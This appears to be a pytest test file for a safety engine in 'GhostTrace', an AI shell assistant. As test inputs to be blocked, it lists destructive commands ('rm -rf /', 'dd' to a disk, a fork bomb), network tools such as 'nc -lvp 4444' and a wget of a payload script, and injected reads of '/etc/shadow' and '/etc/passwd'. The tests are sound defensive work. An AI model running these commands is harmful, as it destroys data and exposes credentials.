"""Unit tests for GhostTrace deterministic safety engine."""

from __future__ import annotations

import pytest

from ghosttrace.safety import InputCategory, RiskLevel, SafetyEngine, classify_input


@pytest.fixture
def safety() -> SafetyEngine:
    return SafetyEngine()


def test_empty_and_whitespace_command(safety: SafetyEngine):
    report = safety.analyze("   ")
    assert report.risk_level == RiskLevel.MALFORMED
    assert not report.is_allowed
    assert not report.requires_confirmation
    assert "Empty command" in report.reason


def test_malformed_quotes(safety: SafetyEngine):
    report = safety.analyze('echo "unclosed quote')
    assert report.risk_level == RiskLevel.MALFORMED
    assert not report.is_allowed


@pytest.mark.parametrize(
    "forbidden_cmd,metachar",
    [
        ("ls && cat secret.txt", "&&"),
        ("pwd || echo failed", "||"),
        ("ls | grep foo", "|"),
        ("echo hello; rm test", ";"),
        ("echo secret > file.txt", ">"),
        ("echo secret >> file.txt", ">>"),
        ("cat < file.txt", "<"),
        ("echo `whoami`", "`"),
        ("echo $(id)", "$("),
        ("echo ${HOME}", "${"),
        ("ls &", "&"),
        ("ls & dir", "&"),
    ],
)
def test_shell_metacharacters_rejected(safety: SafetyEngine, forbidden_cmd: str, metachar: str):
    report = safety.analyze(forbidden_cmd)
    assert report.risk_level == RiskLevel.BLOCKED
    assert not report.is_allowed
    assert not report.requires_confirmation
    assert "Forbidden" in report.reason or "blocked" in report.reason.lower()


@pytest.mark.parametrize(
    "destructive_cmd",
    [
        "rm -rf /",
        "rm -f sensitive.db",
        "rmdir old_dir",
        "del /f /q C:\\data",
        "erase file.txt",
        "format C:",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb",
        "shred -u private.key",
        "diskpart",
        "Remove-Item -Recurse C:\\temp",
    ],
)
def test_destructive_commands_permanently_blocked(safety: SafetyEngine, destructive_cmd: str):
    report = safety.analyze(destructive_cmd)
    assert report.risk_level == RiskLevel.BLOCKED
    assert not report.is_allowed
    assert "Destructive command" in report.reason or "permanently blocked" in report.reason


def test_fork_bomb_blocked(safety: SafetyEngine):
    report = safety.analyze(":(){ :|:& };:")
    assert report.risk_level == RiskLevel.BLOCKED
    assert not report.is_allowed


@pytest.mark.parametrize(
    "unallowed_cmd",
    [
        "curl https://example.com",
        "wget https://example.com/payload.sh",
        "nc -lvp 4444",
        "powershell -Command Invoke-RestMethod",
        "bash script.sh",
    ],
)
def test_unallowlisted_commands_blocked(safety: SafetyEngine, unallowed_cmd: str):
    report = safety.analyze(unallowed_cmd)
    assert report.risk_level == RiskLevel.BLOCKED
    assert not report.is_allowed
    assert "not in the GhostTrace allowlist" in report.reason


@pytest.mark.parametrize(
    "safe_cmd",
    [
        "ls",
        "ls -la",
        "dir",
        "pwd",
        "cd ..",
        "whoami",
        "date",
        "time",
        "echo Greetings from the void",
        "git status",
        "git log -n 5",
        "git diff",
    ],
)
def test_safe_commands_allowed(safety: SafetyEngine, safe_cmd: str):
    report = safety.analyze(safe_cmd)
    assert report.risk_level == RiskLevel.SAFE
    assert report.is_allowed
    assert not report.requires_confirmation
    assert len(report.explanation) > 0


@pytest.mark.parametrize(
    "sensitive_cmd",
    [
        "python app.py",
        "python3 main.py",
        "pip install requests",
        "pytest -v",
        "git commit -m 'new feature'",
        "git push origin master",
        "git checkout -b new-branch",
    ],
)
def test_sensitive_commands_require_confirmation(safety: SafetyEngine, sensitive_cmd: str):
    report = safety.analyze(sensitive_cmd)
    assert report.risk_level == RiskLevel.SENSITIVE
    assert report.is_allowed
    assert report.requires_confirmation


@pytest.mark.parametrize(
    "builtin_input",
    [
        "help",
        "HELP",
        "exit",
        "EXIT",
        "quit",
        "clear",
        "cls",
        "status",
        "model",
        "model gemma3:4b",
        "personality",
        "personality cyber_poltergeist",
        "explain ls",
    ],
)
def test_classify_builtin_commands(builtin_input: str):
    """Verify built-in interactive commands are deterministically classified as BUILTIN."""
    assert classify_input(builtin_input) == InputCategory.BUILTIN


@pytest.mark.parametrize(
    "conversational_input",
    [
        "hi",
        "HI",
        "hello",
        "Hello!",
        "hey",
        "hey there",
        "greetings",
        "good morning",
        "who are you?",
        "who are you",
        "what are you?",
        "what is your name?",
        "are you a ghost?",
        "tell me a ghost story",
        "tell me a scary story",
        "tell a ghost story",
        "how are you?",
        "why are you here?",
        "thank you",
        "thanks!",
        "bye",
    ],
)
def test_classify_conversational_inputs(conversational_input: str):
    """Verify greetings, identity questions, and ghost story requests are classified as CONVERSATION."""
    assert classify_input(conversational_input) == InputCategory.CONVERSATION


@pytest.mark.parametrize(
    "command_input",
    [
        "ls",
        "ls -la",
        "dir",
        "pwd",
        "whoami",
        "cat file.txt",
        "git status",
        "python main.py",
        "unknowncmd",
        "nonexistent_binary --flag",
    ],
)
def test_classify_shell_commands(command_input: str):
    """Verify allowlisted and unknown OS utilities are classified as COMMAND."""
    assert classify_input(command_input) == InputCategory.COMMAND


@pytest.mark.parametrize(
    "dangerous_conversational_input",
    [
        "hi && rm -rf /",
        "hello; del C:\\secret",
        "can you rm -rf /?",
        "tell me to rm -rf /",
        "tell me how to delete everything",
        "format C: please",
        "hey | cat /etc/shadow",
        "who are you `cat /etc/passwd`",
    ],
)
def test_classify_dangerous_inputs_phrased_conversationally(dangerous_conversational_input: str):
    """Verify dangerous syntax or destructive commands phrased conversationally are strictly classified as COMMAND."""
    assert classify_input(dangerous_conversational_input) == InputCategory.COMMAND

